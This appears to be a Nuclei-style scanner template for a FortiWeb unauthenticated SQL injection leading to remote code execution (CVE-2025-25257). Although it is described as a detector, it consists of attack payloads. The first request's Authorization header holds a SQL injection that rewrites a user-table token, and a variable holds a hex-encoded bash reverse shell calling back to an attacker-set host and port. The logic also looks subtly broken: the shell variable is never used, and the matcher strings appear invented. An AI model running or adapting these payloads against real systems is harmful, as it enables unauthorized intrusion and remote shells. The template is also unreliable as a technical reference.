id: cve-2025-25257

info:
  name: FortiWeb Unauthenticated SQL Injection to RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Detects FortiWeb Unauthenticated SQL Injection vulnerability (CVE-2025-25257) that can lead to Remote Code Execution.
  tags: fortiweb, sql-injection, rce, critical

variables:
  encoded_command: "{{hex_encode('bash -c \"/bin/bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\"')}}"
  lhost: "127.0.0.1"
  lport: "4444"

http:
  - raw:
      - |
        GET /api/fabric/device/status HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer '/**/;UPDATE/**/fabric_user.user_table/**/SET/**/token=UNHEX("68656c6c6f")/**/;SELECT/**/'1'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "token updated"

  - raw:
      - |
        GET /cgi-bin/ml-draw.py HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Shell executed"
